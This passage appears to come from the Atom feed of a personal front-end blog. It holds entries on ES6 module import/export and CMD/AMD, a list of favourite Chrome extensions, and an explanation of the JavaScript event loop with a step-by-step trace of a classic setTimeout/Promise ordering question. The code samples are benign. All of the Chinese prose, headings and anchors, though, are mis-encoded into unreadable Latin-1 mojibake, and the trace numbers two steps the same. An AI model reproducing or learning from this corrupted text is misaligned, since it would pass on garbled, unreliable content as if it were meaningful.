&apos;my_module&apos;;</span><br><span class="line"></span><br><span class="line">// ===&gt;</span><br><span class="line"></span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><blockquote><p>å¯¼å…¥é»˜è®¤æ¨¡å—</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js</span><br><span class="line">export default function () &#123;</span><br><span class="line">  console.log(&apos;foo&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// import-default.js</span><br><span class="line">import customName from &apos;./export-default&apos;;</span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><h4 id="å¯¼å…¥åˆ«åè®¾ç½®"><a href="#å¯¼å…¥åˆ«åè®¾ç½®" class="headerlink" title="å¯¼å…¥åˆ«åè®¾ç½®"></a>å¯¼å…¥åˆ«åè®¾ç½®</h4><p>å°†surnameæ˜¯lastNameçš„åˆ«å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile.js&apos;;</span><br></pre></td></tr></table></figure><p>å°†å¤šä¸ªæ–¹æ³•èåˆæˆä¸€ä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// circle.js</span><br><span class="line"></span><br><span class="line">export function area(radius) &#123;</span><br><span class="line">  return Math.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function circumference(radius) &#123;</span><br><span class="line">  return 2 * Math.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import * as circle from &apos;./circle&apos;;</span><br><span class="line"></span><br><span class="line">console.log(&apos;åœ†é¢ç§¯ï¼š&apos; + circle.area(4));</span><br><span class="line">console.log(&apos;åœ†å‘¨é•¿ï¼š&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure><h4 id="æŒ‰éœ€åŠ è½½"><a href="#æŒ‰éœ€åŠ è½½" class="headerlink" title="æŒ‰éœ€åŠ è½½"></a>æŒ‰éœ€åŠ è½½</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(&apos;./utils.js&apos;)</span><br><span class="line">.then(Util =&gt; &#123;</span><br><span class="line">    console.log(Util);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>CMD(common module definition), æ˜¯sea.jsåœ¨æ¨å¹¿è¿‡ç¨‹ä¸­å¯¹æ¨¡å—å®šä¹‰çš„è§„èŒƒåŒ–äº§å‡ºï¼Œä¸»è¦ç”¨äºæµè§ˆå™¨ç«¯ã€‚æ¨å´‡ä¾èµ–å°±è¿‘ã€å»¶è¿Ÿæ‰§è¡Œã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šæ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œåœ¨æ¨¡å—ä¸­å®šä¹‰çš„å˜é‡ã€å‡½æ•°ã€ç±»éƒ½æ˜¯ç§æœ‰çš„ï¼Œå¯¹å¤–ä¸å¯è§ã€‚æœ‰ä¸€ä¸ªå…¨å±€æ€§æ–¹æ³•require()ï¼Œç”¨äºåŠ è½½æ¨¡å—</p><p>AMDè§„èŒƒï¼ˆAsynchronous Module Definitionï¼‰ï¼šæ˜¯ RequireJS åœ¨æ¨å¹¿è¿‡ç¨‹ä¸­å¯¹æ¨¡å—å®šä¹‰çš„è§„èŒƒåŒ–äº§å‡ºï¼Œä¹Ÿæ˜¯ä¸»è¦ç”¨äºæµè§ˆå™¨ç«¯ã€‚å…¶ç‰¹ç‚¹æ˜¯ï¼šä¾èµ–å‰ç½®ï¼Œéœ€è¦åœ¨å®šä¹‰æ—¶å°±å†™å¥½éœ€è¦çš„ä¾èµ–ï¼Œæå‰æ‰§è¡Œä¾èµ–ï¼Œåº”ç”¨æœ‰require.js</p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="http://javascript.ruanyifeng.com/nodejs/module.html#toc0" target="_blank" rel="noopener">CommonJSè§„èŒƒ</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨å­¦ä¹ æ–°ä¸€ä¸ªä¸œè¥¿å‰ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯äº†è§£å®ƒèƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„æˆ‘ä»¬ä¸ºä»€ä¹ˆå­¦ä¹ å®ƒï¼Œä»è€Œæ¿€å‘å­¦ä¹ å…´è¶£ï¼Œå“ˆå“ˆå“ˆ~åˆæ‰¯äº†ä¸€å †ï¼Œä¸‹é¢è¿›å…¥æˆ‘ä»¬å‰ç«¯æ¨¡å—åŒ–æ¢ç´¢ä¹‹æ—…å§ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ¨¡å—åŒ–çš„å†å²&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨æ­£å¼è¿›å…¥æ¨¡å—åŒ–å­¦ä¹ å‰æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹å‰ç«¯æ¨¡å—åŒ–çš„å‰ç”Ÿä»Šä¸–ã€‚&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>chromeå¸¸ç”¨æ’ä»¶</title>
    <link href="http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/"/>
    <id>http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/</id>
    <published>2019-03-16T03:08:32.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>chromeå¯ä»¥ç§°ä¹‹ä¸ºå‰ç«¯å¼€å‘è€…çš„ç¥å™¨ï¼Œä¸ç®¡æ˜¯å¼€å‘è¿˜æ˜¯è°ƒè¯•ã€‚å¹¶ä¸”chromeç»™ç”¨æˆ·å¸¦æ¥çš„ä½“éªŒç®€ç›´QAQï¼Œchromeæ’ä»¶æ— ç–‘ä¼šå¤§å¤§æä¾›å·¥ä½œæ•ˆç‡ï¼Œè¿™é‡Œå°†ä¼šåˆ—å‡ºä¸ªäººå¸¸ç”¨çš„chromeæ’ä»¶</p><div><a id="more"></a></div><h2 id="æ’ä»¶åˆ—è¡¨"><a href="#æ’ä»¶åˆ—è¡¨" class="headerlink" title="æ’ä»¶åˆ—è¡¨"></a>æ’ä»¶åˆ—è¡¨</h2><blockquote><p>Fair AdBlocker</p></blockquote><p>è¿œç¦»é‚£äº›è®¨åŒçš„å¹¿å‘Šå§ã€‚<br>å³å‡»é€‰ä¸­å¯¹åº”å‘½ä»¤ï¼Œç‚¹å‡»è¦æ¶ˆé™¤çš„elementï¼Œå³å¯æ°¸ä¹…æ¶ˆé™¤å¯¹åº”çš„AdBlockerã€‚</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_2a13j39fgc4a8l7db14kh8438jekg_648x398.png" alt=""></p><p>æ€»ç»“æ¥è¯´:å—¯ï¼çœŸé¦™</p><blockquote><p>Infinity</p></blockquote><p>Infinity,è¶…æ£’çš„æ— å¹¿å‘Šï¼Œä½“éªŒå¥½çš„ã€‚å¯¼èˆªé¡µ</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_0l5glj75lb0b6fb6hdf727ea1ij7f_1235x860.png" alt=""></p><blockquote><p>Allow-Control-Allow-Origin</p></blockquote><p>è§£å†³è·¨åŸŸç¥å™¨ã€‚æœ‰æ—¶å€™åç«¯è·Ÿä½ è¯´ï¼Œçº¿ä¸‹ä¸æ”¯æŒè·¨åŸŸï¼Ÿï¼Ÿæ²¡åŠæ³•è‡ªå·±æ”¯æŒå§ï¼Œå°±ç”¨è¿™ä¸ªç¥å™¨</p><blockquote><p>Tampermonkey</p></blockquote><p>ä¿—ç§°ä¸ºçŒ´æ²¹æµè§ˆå™¨æ’ä»¶ï¼Œæ”¯æŒç¬¬ä¸‰æ–¹JSæ³¨å…¥ï¼Œå®ç°æ¯”è¾ƒé…·ç‚«çš„äº‹æƒ…ã€‚<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_122h6g0jhf8c2353fga0gaecb51ee_2494x556.png" alt=""></p><p>ä¸‹é¢åˆ—ä¸¾ä¸€ä¸‹ï¼š</p><ul><li>è±†ç“£èµ„æºå¤§å¸ˆ<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4g6gk82abld135e11d57gi7b90g77_2472x1330.png" alt=""></li><li>ç™¾åº¦äº‘ä¸‹è½½åŠ©æ‰‹<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4b5l6ahibd5cgfdd4cj7dc3e76bcb_1966x1296.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;chromeå¯ä»¥ç§°ä¹‹ä¸ºå‰ç«¯å¼€å‘è€…çš„ç¥å™¨ï¼Œä¸ç®¡æ˜¯å¼€å‘è¿˜æ˜¯è°ƒè¯•ã€‚å¹¶ä¸”chromeç»™ç”¨æˆ·å¸¦æ¥çš„ä½“éªŒç®€ç›´QAQï¼Œchromeæ’ä»¶æ— ç–‘ä¼šå¤§å¤§æä¾›å·¥ä½œæ•ˆç‡ï¼Œè¿™é‡Œå°†ä¼šåˆ—å‡ºä¸ªäººå¸¸ç”¨çš„chromeæ’ä»¶&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="chrome" scheme="http://zhoushaw.github.io/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>Event loop</title>
    <link href="http://zhoushaw.github.io/2019/03/01/learning/font-end/event%20loop/"/>
    <id>http://zhoushaw.github.io/2019/03/01/learning/font-end/event loop/</id>
    <published>2019-02-28T20:36:35.000Z</published>
    <updated>2019-04-14T13:54:11.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>è¯·é—®ä¸‹é¢è¾“å‡ºçš„ç»“æœæ˜¯ä»€ä¹ˆ</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>çº³å°¼ï¼Ÿï¼Ÿä»¿ä½›åˆå›æƒ³äº†å½“åˆè¢«é¢è¯•å®˜æ”¯é…æ—¶çš„ææƒ§äº†ï¼ï¼</p><p>éªšå¹´ç¨³ä½åˆ«æ…Œï¼Œè¿™é“é¢è¯•é¢˜è€ƒå¯Ÿçš„æ˜¯ä½ å¯¹Event loopäº‹ä»¶å¾ªç¯çš„ç†è§£ï¼Œå½“ä½ æ·±å…¥äº†è§£æµè§ˆå™¨æˆ–Nodeä¸­å¦‚ä½•å¤„ç†äº‹ä»¶å¾ªç¯çš„æ—¶å€™ï¼Œä¸Šé¢æ­¤ç±»é¢˜ç›®å¯¹ä½ æ¥è¯´å°±æ˜¯so easyï¼Œå¥½äº†è¯ä¸å¤šè¯´è®©æˆ‘ä»¬å¿«é€Ÿè¿›å…¥æ­£é¢˜å§ã€‚</p><div><a id="more"></a></div><h2 id="Event-loop"><a href="#Event-loop" class="headerlink" title="Event loop"></a>Event loop</h2><blockquote><p>æ˜¯ä»€ä¹ˆ</p></blockquote><p><strong>Event loop</strong>å³äº‹ä»¶å¾ªç¯ï¼Œæ˜¯æµè§ˆå™¨å’ŒNodeç¯å¢ƒä¸­è¿è¡Œ<strong>å•çº¿ç¨‹JavaScript</strong>ä¸€ç§ä¸é˜»å¡è¿è¡Œçš„ä¸€ç§æœºåˆ¶ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¸¸ç§°ä¹‹ä¸ºçš„å¼‚æ­¥çš„åŸç†ã€‚</p><blockquote><p>æœ‰ä»€ä¹ˆä½œç”¨</p></blockquote><ul><li><p>ç±»ä¼¼äºä¸Šé¢é—®ç­”ä¸­çš„ä»£ç ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸ä¼šäº§ç”Ÿçš„ã€‚ä½†æ˜¯ç”±äºä¸€äº›ä¸šåŠ¡åœºæ™¯è¿«ä½¿æˆ‘ä»¬<strong>ä¸å¯é¿å…çš„ç¼–å†™å‡ºå¤šä¸ªå¼‚æ­¥äº‹ä»¶</strong>ï¼Œè€Œæˆ‘ä»¬å¯¹å…¶<strong>è¿è¡Œé¡ºåºä¸çŸ¥å…¶æ‰€ä»¥ç„¶</strong>ï¼Œéš¾å…ä¼šé€ æˆä¸å¿…è¦çš„å›°æ‰°</p></li><li><p>å½“ç„¶Event loopä¹Ÿæ˜¯é¢è¯•åœºä¸Šçš„å¸¸èƒœå°†å†›ï¼Œå¤§å¤šæ•°åŒå­¦éƒ½<strong>æŠ˜æˆŸäºæ­¤</strong></p></li><li><p>å¸‚åœºä¸Šæ¡†æ¶ã€æ–°æŠ€æœ¯å±‚å‡ºä¸ç©·ï¼Œæƒ³è¦åœ¨é£äº‘çªå˜çš„æˆ˜åœºä¸Šç¨³ä½è„šè·Ÿå°±å¿…é¡»<strong>ä¿®ç‚¼å¥½å†…åŠŸ</strong>ï¼Œäº†è§£ä¸€äº›åº•å±‚åŸç†æ— éæ˜¯éå¸¸å¥½çš„è·¯å¾„</p></li></ul><h2 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h2><p>åœ¨æ­£å¼Event loopè®²è§£å‰ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹åŸºæœ¬æ•°æ®ç»“æ„çŸ¥è¯†</p><blockquote><p>é˜Ÿåˆ—</p></blockquote><p>é˜Ÿåˆ—æ˜¯ä¸€ç§æ“ä½œå—é™åˆ¶çš„çº¿æ€§è¡¨ï¼Œå®ƒåªè¿è¡Œä»<strong>è¡¨çš„å‰ç«¯(front)</strong>è¿›è¡Œåˆ é™¤æ“ä½œï¼Œ<strong>è¡¨çš„åç«¯(rear)</strong>è¿›è¡Œæ·»åŠ æ“ä½œã€‚</p><p>è¿›è¡Œåˆ é™¤æ“ä½œçš„ç§°ä¹‹ä¸º<strong>è¡¨å¤´</strong>ï¼Œæ·»åŠ æ“ä½œçš„ç§°ä¹‹ä¸º<strong>è¡¨å°¾</strong>ï¼Œç©ºçš„é˜Ÿåˆ—ç§°ä¹‹ä¸º<strong>ç©ºé˜Ÿåˆ—</strong>ã€‚</p><p>é˜Ÿåˆ—çš„çº¿æ€§ç»“æ„èµ‹äºˆ<strong>å…¶å…ˆè¿›å…ˆå‡º</strong>çš„ç‰¹æ€§</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_80cgh13fd23fjkahjd296l7ig9e68_1152x241.jpg" alt=""></p><blockquote><p>æ ˆ</p></blockquote><p>æ ˆæ˜¯ä¸€ç§æ“ä½œå—é™åˆ¶çš„çº¿æ€§è¡¨ï¼Œå®ƒåªè¿è¡Œä»è¡¨çš„<strong>å°¾ç«¯(rear)</strong>è¿›è¡Œ<strong>æ·»åŠ æ“ä½œå’Œåˆ é™¤æ“ä½œ</strong></p><p>æ ˆçš„é™åˆ¶ç»“æ„èµ‹äºˆå…¶<strong>å…ˆè¿›åå‡º</strong>çš„ç‰¹æ€§</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_3g51f9k9h099ga3lecj98d6adchh5_1344x752.jpg" alt=""></p><h2 id="Event-loopä»»åŠ¡"><a href="#Event-loopä»»åŠ¡" class="headerlink" title="Event loopä»»åŠ¡"></a>Event loopä»»åŠ¡</h2><p>åœ¨JavaScriptä¸­ï¼Œä¼šå°†æ‰§è¡Œçš„ä»»åŠ¡åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç§æ˜¯<strong>å®ä»»åŠ¡</strong>(MacroTask)ç®€ç§°ä¸º<strong>Task</strong>,å¦ä¸€ç§æ˜¯<strong>å¾®ä»»åŠ¡</strong>(MicroTask)</p><blockquote><p>å®ä»»åŠ¡ç±»å‹</p></blockquote><p><strong>scriptå…¨éƒ¨ä»£ç </strong>ã€<strong>setTimeout</strong>ã€<strong>setInterval</strong>ã€<strong>I/O</strong>ã€<strong>UI Rendering</strong></p><blockquote><p>å¾®ä»»åŠ¡</p></blockquote><p><strong>Process.nextTick</strong>ï¼ˆNodeç‹¬æœ‰ï¼‰ã€<strong>Promise</strong>ã€<strong>MutationObserver</strong></p><h2 id="æµè§ˆå™¨Event-loop"><a href="#æµè§ˆå™¨Event-loop" class="headerlink" title="æµè§ˆå™¨Event loop"></a>æµè§ˆå™¨Event loop</h2><p>åœ¨JavaScriptä¸­æœ‰ä¸€ä¸ª<strong>ä¸»çº¿ç¨‹</strong>(main thread) å’Œ<strong>è°ƒç”¨æ ˆ</strong> (call-stack) ,æ‰€æœ‰ä»»åŠ¡éƒ½ä¼šè¢«æ”¾åˆ°è°ƒç”¨æ ˆç­‰å¾…ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</p><blockquote><p>JSè°ƒç”¨æ ˆ</p></blockquote><p>JSè°ƒç”¨æ ˆé‡‡ç”¨æ ˆç»“æ„ï¼Œæ˜¯å…ˆè¿›åå‡ºè§„åˆ™ï¼Œå½“å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ä¼šæ”¾åˆ°æ ˆçš„é¡¶éƒ¨ï¼Œå½“å‡½æ•°æ‰§è¡Œå®Œæˆä¼šå°†å‡½æ•°ä»æ ˆé¡¶ç§»é™¤ï¼Œé‡åˆ°æ–°å‡½æ•°ä¼šæ–°å‡½æ•°å°†æ¨å…¥æ ˆå†…ï¼Œæ‰§è¡Œå®Œæˆä»æ ˆé¡¶ç§»é™¤ï¼Œç›´åˆ°æ ˆè¢«æ¸…ç©º</p><p>åˆ—å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function task1 () &#123;</span><br><span class="line">    console.log(&apos;task1&apos;);</span><br><span class="line">&#125;</span><br><span class="line">function task2 () &#123;</span><br><span class="line">    task1();</span><br><span class="line">    console.log(&apos;hello world&apos;);</span><br><span class="line">&#125;</span><br><span class="line">task2();</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåˆ°task1()æ—¶ï¼Œæ ˆå†…å®¹ä¸º:task2 task1ï¼Œä¾æ¬¡æ‰§è¡Œå¹¶ç§»é™¤task1ã€task2</p><blockquote><p>åŒæ­¥ä»»åŠ¡å’Œå¼‚æ­¥ä»»åŠ¡</p></blockquote><p>åœ¨JavaScriptå°†ä»»åŠ¡åˆ†ä¸ºåŒæ­¥ä»»åŠ¡å’Œå¼‚æ­¥ä»»åŠ¡ï¼ŒåŒæ­¥ä»»åŠ¡å°†ä¾æ¬¡æ”¾å…¥è°ƒç”¨æ ˆä¸­æŒ‰ç…§å…ˆè¿›åå‡ºçš„è§„åˆ™ï¼Œæ”¾å…¥ä¸»çº¿ç¨‹æ‰§è¡Œã€‚å¼‚æ­¥ä»»åŠ¡åˆ™æ˜¯ç­‰å¾…æ‰§è¡Œç»“æœè¿”å›åæ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—ä¸­ç­‰å¾…ä¸»çº¿ç¨‹ç©ºé—²æ—¶(è°ƒç”¨æ ˆä¸ºç©ºæ—¶ï¼ŒåŒæ­¥ä»»åŠ¡è¢«æ‰§è¡Œå®Œæˆæ—¶)ï¼Œè¢«è¯»å–åˆ°è°ƒç”¨æ ˆå†…ç­‰å¾…ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</p><p>ç®€å•æ¥è¯´å¯ä»¥å°†å…¶åŒºåŸŸåˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸ:</p><ul><li>ä»»åŠ¡é˜Ÿåˆ—åŒº</li><li>ä¸»çº¿ç¨‹æ‰§è¡ŒåŒº</li><li>MacroTaskåŒº</li><li>MicroTaskåŒº</li></ul><blockquote><p>ä»»åŠ¡ä¹‹é—´æ‰§è¡Œé¡ºåº</p></blockquote><p>JavaScriptä»£ç åœ¨è¿è¡Œæ—¶ï¼Œä¸»çº¿ç¨‹é¡ºåºæ‰§è¡Œä»£ç ï¼ŒæŒ‰ç…§æ ˆçš„ç»“æ„å…ˆè¿›åå‡ºï¼Œå°†å¾®ä»»åŠ¡å­˜å…¥å¾®ä»»åŠ¡åŒºï¼Œå®ä»»åŠ¡å­˜å…¥å®ä»»åŠ¡åŒºã€‚</p><p>##<br>å½“ä»»åŠ¡é˜Ÿåˆ—ä»»åŠ¡ä¸ºç©ºæ—¶ï¼Œå°†ä¼šæŸ¥çœ‹MicroTaskåŒºé˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ºç©ºåˆ™æŸ¥è¯¢MacroTaskåŒºå¹¶æ‰§è¡Œã€‚è‹¥ä¸ä¸ºç©ºåˆ™æ‰§è¡ŒMicroTaskåŒºä»»åŠ¡ï¼Œè‹¥é‡åˆ°ä»»åŠ¡ä¸­å­˜åœ¨MacroTaskå°†å­˜å…¥MacroTaskåŒºé˜Ÿå°¾ã€‚æ‰§è¡ŒMicroTaskä»»åŠ¡å®Œæˆåå°†ï¼Œæ‰§è¡ŒMacroTaskåŒºä»»åŠ¡</p><h2 id="è§£ç­”æ–‡ç« å¤´éƒ¨æå‡ºçš„é—®é¢˜"><a href="#è§£ç­”æ–‡ç« å¤´éƒ¨æå‡ºçš„é—®é¢˜" class="headerlink" title="è§£ç­”æ–‡ç« å¤´éƒ¨æå‡ºçš„é—®é¢˜"></a>è§£ç­”æ–‡ç« å¤´éƒ¨æå‡ºçš„é—®é¢˜</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>JavaScriptåœ¨è¿è¡Œè¿™æ®µä»£ç é€è¡Œæ‰§è¡Œï¼ŒæŒ‰ç…§è°ƒç”¨æ ˆã€å®ä»»åŠ¡ã€å¾®ä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#è¿‡ç¨‹ä¸€:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹äºŒ:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹ä¸‰:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then</span><br><span class="line"></span><br><span class="line">Log:  script startã€ script end</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹å››:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then promise2</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script startã€ script endã€promise1</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹äº”:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then promise2</span><br><span class="line"></span><br><span class="line">Log:  script startã€ script endã€promise1</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹äº”:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script startã€ script endã€promise1ã€promise2</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹å…­:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task: setTimeout</span><br><span class="line"></span><br><span class="line">Log:  script startã€ script endã€promise1ã€promise2</span><br><span class="line"></span><br><span class="line">#è¿‡ç¨‹ä¸ƒ:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task:</span><br><span class="line"></span><br><span class="line">Log:  script startã€ script endã€promise1ã€promise2ã€setTimeout</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
